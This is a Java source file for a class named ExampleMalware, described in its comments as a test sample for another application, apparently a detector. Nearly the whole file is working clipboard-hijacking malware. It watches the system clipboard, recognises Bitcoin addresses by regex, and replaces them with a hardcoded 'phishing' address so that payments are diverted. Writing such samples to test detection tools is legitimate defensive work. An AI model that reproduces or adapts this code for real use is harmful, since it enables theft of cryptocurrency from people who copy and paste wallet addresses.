// This is a simple example of an application detecting a Bitcoin address
// and changing it to a different one, for testing the main application

package clipboardchanger;


import java.awt.*;
import java.awt.datatransfer.*;

public class ExampleMalware extends Thread implements ClipboardOwner {

    public static final String BITCOIN_REGEX = "^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$";
    public static final Clipboard cb = Toolkit.getDefaultToolkit().getSystemClipboard();

    public static final String phishingAddress = "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy";

    String previousAddress = "";

    public void run() {
        System.out.println("Listening to board...");
        Transferable trans = cb.getContents(this);
        processContentsAndRegainOwnership(trans);
        while(true) {}
    }


    public void lostOwnership(Clipboard c, Transferable t) {
        try {
            this.sleep(20);
        } catch(Exception e) {
            System.out.println("Exception: " + e);
        }

        String previousClip = transferableToString(t);
        if(isBitcoinAddress(previousClip)) {
            previousAddress = previousClip;
        } else {
            previousAddress = "";
        }

        Transferable contents = cb.getContents(this);
        String s = transferableToString(contents);
        if(isBitcoinAddress(s) && !s.equals(phishingAddress)) {
            processContentsAndRegainOwnership(contents);
        }
    }

    public void processContentsAndRegainOwnership(Transferable t) {
        String s = transferableToString(t);
        StringSelection newString = new StringSelection(phishingAddress);
        cb.setContents(newString, this);
        System.out.println("ADDRESS HIJACKED");
    }

    // Convert Transferable to String
    public String transferableToString(Transferable t) {
        String s = "";
        try {
            s = t.getTransferData(DataFlavor.stringFlavor).toString();
        } catch (Exception e) {
            System.out.println("Exception: " + e);
        }

        if(s.equals("")) {
            return "FAILED TO GET STRING";
        } else {
            return s;
        }
    }

    // Check for a valid Bitcoin address
    public boolean isBitcoinAddress(String s) {
        return s.matches(BITCOIN_REGEX);
    }

    public static void main(String[] args) {
        ExampleMalware b = new ExampleMalware();
        b.run();
    }

}
